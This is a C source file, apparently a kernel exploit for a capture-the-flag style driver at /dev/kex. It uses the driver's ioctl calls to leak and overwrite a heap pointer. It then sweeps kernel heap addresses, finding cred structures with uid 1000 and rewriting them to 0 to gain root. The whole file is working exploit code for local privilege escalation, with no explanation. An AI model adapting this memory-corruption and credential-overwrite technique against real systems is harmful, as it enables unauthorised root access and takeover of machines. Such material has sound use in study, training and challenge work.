#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/uio.h>
#include <sys/utsname.h>


#define KKK      
#define KEX_IOCTL      0x43544601
#define KEX_IOCTL2     0x43544601+1 // kex_leak
#define KEX_IOCTL3     0x43544601+2 // kex_write
#define KEX_IOCTL6     0x43544601+5 // kex_findfree
#define KEX_IOCTL8     0x43544601+7 // kex_replace

void DumpHex(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            printf(" ");
            if ((i+1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}

struct replace_args {
    char buf[0x8];
    int size;
    char padding[20];
    char dst[0x20];
    
};

struct ex_args {
    char buf[0x20];
    unsigned int idx;
    unsigned int a;// kex_find + b << 2
};

void alloc(int fd, char *buf){
    int ret = ioctl(fd, KEX_IOCTL, buf);
    if ( ret < 0 )
    {
        perror("ioctl");
        exit(EXIT_FAILURE);
    }
    //DumpHex(buf, 0x20);
}

int replace(int fd, struct replace_args *buf){
    //DumpHex(buf, 0x44);
    int ret = ioctl(fd, KEX_IOCTL8, buf);
    return ret;
    // DumpHex(buf, 0x44);
}

void ex_read(int fd, struct ex_args *buf){
    //DumpHex(buf, 0x28);
    int ret = ioctl(fd, KEX_IOCTL2, buf);
    if ( ret < 0 )
    {
        perror("ioctl");
        exit(EXIT_FAILURE);
    }
    // DumpHex(&buf->a, 0x4);
}

void ex_write(int fd, struct ex_args *buf){
    //DumpHex(buf, 0x28);
    int ret = ioctl(fd, KEX_IOCTL3, buf);
    if ( ret < 0 )
    {
        perror("ioctl");
        exit(EXIT_FAILURE);
    }
    // DumpHex(&buf->a, 0x4);
}

int main(int argc, char *argv[]){
	

    char test[0x20] = "ABCDEFGHIJKLMNOP";
    char test2[0x20] = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
    char test3[0x20] = "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC";
    struct replace_args replace_args;
    struct ex_args ex_args;

	int fd, ret;

    unsigned int s= 0x83000000;

    for (s = 0x83eb0000; s<0x83f00000;s=s+0x100){ // heap addr = 0x83eb0000
        fd = open("/dev/kex", O_RDONLY);
        if ( fd < 0 )
        {
            perror("open");
            exit(EXIT_FAILURE);
        }

        alloc(fd, test);
        alloc(fd, test2);
        alloc(fd, test3);
        memset(&ex_args,0,sizeof(ex_args)); 
        strcpy(ex_args.buf, "ABCDEFGH");
        ex_args.a = 0;
        ex_args.idx = 255;
        ex_read(fd, &ex_args); // Can leak alloc(fd, test) address;


        memset(&ex_args,0,sizeof(ex_args));
        strcpy(ex_args.buf, "ABCDEFGH");
        ex_args.a = s+0x4;
        ex_args.idx = 255;
        ex_write(fd, &ex_args); // Overwrite alloc(fd, test) address;
        
        memset(&replace_args, 0, sizeof(replace_args));
        strcpy(replace_args.buf, "\xe8\x03\x00\x00\xe8\x03\x00\x00\xe8\x03\x00\x00\xe8\x03\x00\x00"); // find cred->uid,.... = 1000;
        replace_args.size = 0x20;
        strcpy(replace_args.dst, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"); // replace cred->uid.. = 0;
        replace(fd, &replace_args);
        close(fd);
    }
}


